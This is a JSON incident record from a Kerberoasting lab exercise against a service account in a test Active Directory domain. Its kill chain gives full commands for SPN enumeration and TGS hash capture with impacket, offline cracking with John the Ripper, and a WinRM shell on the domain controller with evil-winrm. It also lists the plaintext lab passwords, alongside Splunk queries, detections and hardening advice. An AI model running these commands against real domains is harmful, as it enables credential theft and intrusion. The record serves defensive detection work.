@@ -1,0 +1,151 @@
+{
+  "incident": {
+    "id": "ATK-003",
+    "title": "Kerberoasting — svc-jenkins TGS Hash Capture and Crack",
+    "severity": "CRITICAL",
+    "status": "Documented — Lab Exercise",
+    "environment": "CorpLab",
+    "domain": "corp.local",
+    "date": "2026-04-23",
+    "attacker_ip": "10.10.10.99",
+    "target_account": "svc-jenkins",
+    "target_spn": "HTTP/jenkins.corp.local",
+    "starting_credentials": "jsmith:Password123!",
+    "outcome": "svc-jenkins password cracked. WinRM shell obtained on DC01 as svc-jenkins.",
+    "mitre_techniques": [
+      "T1558.003 - Kerberoasting",
+      "T1110.002 - Password Cracking",
+      "T1021.006 - WinRM"
+    ]
+  },
+  "kill_chain": [
+    {
+      "stage": 1,
+      "name": "SPN Enumeration",
+      "technique": "T1558.003",
+      "tool": "impacket-GetUserSPNs",
+      "command": "impacket-GetUserSPNs corp.local/jsmith:Password123! -dc-ip 10.10.10.40",
+      "result": "svc-jenkins identified with SPN HTTP/jenkins.corp.local. PasswordLastSet 2026-03-26. LastLogon never.",
+      "detected": false,
+      "detection_note": "LDAP query — no Security event log entry generated. VIS-005."
+    },
+    {
+      "stage": 2,
+      "name": "TGS Ticket Request",
+      "technique": "T1558.003",
+      "tool": "impacket-GetUserSPNs -request",
+      "command": "impacket-GetUserSPNs corp.local/jsmith:Password123! -dc-ip 10.10.10.40 -request",
+      "result": "$krb5tgs$23$*svc-jenkins$CORP.LOCAL$corp.local/svc-jenkins* hash captured. Encryption type 0x17 (RC4).",
+      "detected": true,
+      "detection_note": "EC4768 (TGT) + EC4769 (TGS) at 18:01:36 — 9ms apart. Client_Address=::ffff:10.10.10.99. Ticket_Encryption_Type=0x17."
+    },
+    {
+      "stage": 3,
+      "name": "Offline Hash Cracking",
+      "technique": "T1110.002",
+      "tool": "John the Ripper",
+      "command": "john --format=krb5tgs --wordlist=/tmp/corp_wordlist.txt /tmp/svc-jenkins.hash",
+      "result": "Service@2025! recovered. Cracked instantly from targeted wordlist.",
+      "detected": false,
+      "detection_note": "Offline operation — no logging system can detect this."
+    },
+    {
+      "stage": 4,
+      "name": "WinRM Access as svc-jenkins",
+      "technique": "T1021.006",
+      "tool": "evil-winrm",
+      "command": "evil-winrm -i 10.10.10.40 -u svc-jenkins -p 'Service@2025!'",
+      "result": "Shell obtained on DC01 as svc-jenkins. *Evil-WinRM* PS C:\\>",
+      "detected": true,
+      "detection_note": "EC4624, NTLM, Logon_Type=3, src_ip=10.10.10.99."
+    }
+  ],
+  "splunk_evidence": [
+    {
+      "query": "index=windows EventCode=4769 Ticket_Encryption_Type=0x17 | where NOT match(Service_Name, \"\\\\$$\") | stats count by Account_Name, Service_Name, Client_Address",
+      "result": "1 event — jsmith@CORP.LOCAL → svc-jenkins from ::ffff:10.10.10.99",
+      "event_count": 1
+    },
+    {
+      "query": "index=windows | search src_ip=\"::ffff:10.10.10.99\" OR Client_Address=\"::ffff:10.10.10.99\" | stats count by EventCode, Account_Name, Service_Name",
+      "result": "EC4768 jsmith krbtgt (1), EC4769 jsmith@CORP.LOCAL svc-jenkins (1)",
+      "event_count": 2
+    },
+    {
+      "query": "index=windows | search Client_Address=\"::ffff:10.10.10.99\" | table _time, EventCode, Account_Name, Service_Name, Ticket_Encryption_Type | sort _time",
+      "result": "18:01:36.724 EC4768 jsmith krbtgt 0x17 | 18:01:36.733 EC4769 jsmith@CORP.LOCAL svc-jenkins 0x17",
+      "event_count": 2,
+      "timing_gap_ms": 9
+    }
+  ],
+  "iocs": {
+    "attacker_ip": "10.10.10.99",
+    "compromised_account": "svc-jenkins",
+    "cracked_password": "Service@2025!",
+    "hash_type": "krb5tgs etype 23 (RC4-HMAC)",
+    "spn": "HTTP/jenkins.corp.local",
+    "tool_used": "impacket-GetUserSPNs v0.14.0"
+  },
+  "detections": [
+    {
+      "id": "DET-003-01",
+      "name": "RC4 TGS Request for Service Account",
+      "eventcode": "4769",
+      "filter": "Ticket_Encryption_Type=0x17 AND Service_Name not ending in $",
+      "evidence_found": true,
+      "mitre": "T1558.003",
+      "severity": "Critical"
+    },
+    {
+      "id": "DET-003-02",
+      "name": "TGT + TGS in same second from non-domain host",
+      "eventcode": "4768+4769",
+      "filter": "9ms gap, same Client_Address, Linux source IP",
+      "evidence_found": true,
+      "mitre": "T1558.003",
+      "severity": "Critical"
+    },
+    {
+      "id": "DET-003-03",
+      "name": "Service account WinRM login from Linux host",
+      "eventcode": "4624",
+      "filter": "Account_Name=svc-jenkins, NTLM, src_ip=10.10.10.99",
+      "evidence_found": true,
+      "mitre": "T1021.006",
+      "severity": "High"
+    },
+    {
+      "id": "DET-003-04",
+      "name": "SPN enumeration via LDAP",
+      "eventcode": "N/A",
+      "filter": "N/A — no log generated",
+      "evidence_found": false,
+      "gap": "VIS-005",
+      "mitre": "T1558.003",
+      "severity": "Gap"
+    }
+  ],
+  "visibility_gaps": [
+    {
+      "id": "VIS-001",
+      "description": "Suricata blind to intra-LAN traffic",
+      "impact": "No network layer detection",
+      "fix": "SPAN port mirroring (Sprint 4)"
+    },
+    {
+      "id": "VIS-005",
+      "description": "SPN enumeration via LDAP is completely silent",
+      "impact": "Attacker identifies all Kerberoastable accounts with zero detection",
+      "fix": "Enable LDAP audit logging or deploy honeypot SPNs"
+    }
+  ],
+  "sigma_rule": "sigma_kerberoasting_T1558.003.yml",
+  "recommendations": [
+    "Implement Group Managed Service Accounts (gMSA) for svc-jenkins — auto-rotating 240-char passwords",
+    "Set msDS-SupportedEncryptionTypes to AES only on all service accounts — disable RC4",
+    "Deploy honeypot SPN account — any TGS request = immediate critical alert",
+    "Reset svc-jenkins password immediately",
+    "Audit all service accounts for SPN registrations and enforce strong passwords",
+    "Investigate how jsmith credentials were obtained (reference ATK-001)"
+  ]
+}
